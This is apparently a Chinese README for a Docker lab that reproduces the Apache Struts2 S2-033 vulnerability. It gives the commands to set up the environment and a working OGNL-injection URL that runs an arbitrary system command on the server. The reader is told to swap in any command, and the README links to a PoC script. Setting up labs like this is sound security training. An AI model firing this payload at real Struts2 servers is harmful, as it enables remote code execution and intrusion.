## Struts2 S2-033 漏洞环境

### 说明

 官方 demo 中提供的 war 包由于添加了 jsp 拦截器，配置会有问题，修正了一下。

### 漏洞信息

 * [S2-033 官方公告](http://struts.apache.org/docs/s2-033.html)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:s_struts2_s2-033
 ```

2. 启动环境

 ```
$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-033
 ```
 > `-p 80:8080` 前面的 80 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

#### Exp

假定启动后的地址为：http://127.0.0.1:8080/

执行 id 命令：

```
http://127.0.0.1:8080/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=id
```

> 修改参数 command 的值为你要执行的命令

### 参考链接

![S2-033_CmdToolExP - coffeehb/Some-PoC-oR-ExP](https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/Struts2/S2-033_CmdToolExP.py)
